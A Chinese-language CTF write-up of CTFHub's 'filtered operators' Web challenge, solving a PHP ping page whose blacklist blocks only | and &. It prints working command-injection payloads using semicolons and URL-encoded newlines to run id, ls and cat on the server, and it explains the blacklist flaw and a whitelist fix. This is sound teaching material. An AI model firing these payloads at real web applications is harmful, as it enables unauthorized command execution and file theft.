# CTFHub Writeup - 过滤运算符

## 题目类型

Web

## 题目描述

题目名称：过滤运算符；平台：CTFHub；方向：Web。

## 解题过程

<br>1. 查看源码可知，程序用 preg\_match\_all 检查输入中是否含有竖线或 &，未匹配时将 ip 拼入 ping -c 4 命令并交给 exec 执行，匹配到时则把匹配结果作为回显。记录中先验证了过滤效果：请求 ?ip=127.0.0.1\|id 返回包含竖线的匹配数组，请求 ?ip=127.0.0.1&&id 返回包含 & 的匹配数组。
<br>2. 使用分号绕过过滤：请求 ?ip=127.0.0.1;id，回显中出现 uid=82(www-data) gid=82(www-data) groups=82(www-data)，说明分号未被正则拦截，id 命令被 shell 执行。
<br>3. 使用换行符绕过：请求 ?ip=127.0.0.1%0aid，其中 %0a 在 URL 解码后是换行符。记录说明实际交给 shell 的内容相当于先执行 ping -c 4 127.0.0.1，再执行 id；回显同样得到 uid=82(www-data) gid=82(www-data) groups=82(www-data)。
<br>4. 利用分号执行目录列举：请求 ?ip=;ls -la /var/www/html，回显中出现 -rw-r--r-- 1 root root 42 ... flag\_259642452711170.php，定位到目标 flag 文件。
<br>5. 读取 flag：请求 ?ip=;cat /var/www/html/flag\_259642452711170.php，回显中出现 \<?php // ctfhub\{69027a88c5b590b3636b88dc\}。记录还指出用换行构造 ?ip=127.0.0.1%0acat /var/www/html/flag\_259642452711170.php 同样可以读取。

## 疑问与解答

### 1.

<br>问题：为什么只过滤竖线和 & 仍然不能阻止命令注入？
<br>解答：shell 的命令分隔符不止竖线和 &，分号 ; 和换行符也能分隔多条命令。程序把用户输入直接拼进命令行后交给 exec，只要输入中保留了任一可用的分隔符，就能在 ping 命令之后追加新的命令；本题中分号和 %0a 都绕过了正则。

### 2.

<br>问题：%0a 为什么能作为绕过方式？
<br>解答：%0a 是换行符的 URL 编码。参数被服务端解码后，换行符进入拼接到 ping 命令的字符串，而 shell 会把换行视为命令分隔，因此可以在原本的 ping 命令后执行下一条命令。这里的绕过成立还依赖于黑名单没有覆盖换行符。

### 3.

<br>问题：这类题目的通用修复思路是什么？
<br>解答：不应把外部输入直接拼入 shell 命令。更安全的做法是使用参数化执行方式，避免经过 shell 解释，同时对输入做严格白名单校验，例如只允许合法 IP 地址格式，而不是仅靠少量特殊字符黑名单。


## 本题的核心逻辑：


<br>本题的核心是命令注入与黑名单绕过。源码将 ip 参数拼接到 ping 命令中并调用 exec，用户输入因此进入 shell 解释流程；过滤只检查竖线和 &，遗漏了分号、换行符等其他命令分隔方式。利用这些分隔符即可在 ping 之后追加 id、ls、cat 等命令，最终完成命令执行并读取 flag。


## 笔记

这道题主要学习了：

<br>1. 分析命令执行类题目时，先看外部输入是否被直接拼接到系统命令，以及是否经过 shell。源码中的 exec 与字符串拼接说明输入进入了 shell 解析范围，少量字符黑名单通常不足以阻止注入。
<br>2. shell 中可分多条命令的符号包括分号、换行、竖线和 & 等。本题正则只覆盖竖线和 &，因此分号和 URL 编码后的换行符都能绕过；构造 Payload 时要结合服务端解码与 shell 解析两阶段理解。
<br>3. 获得命令执行后，可先用 id 确认执行身份，再用 ls 定位 Web 目录中的可疑文件，最后用 cat 读取内容。后续学习应重点掌握命令注入的多种分隔方式、编码绕过以及使用白名单和避免 shell 解析的修复方法。
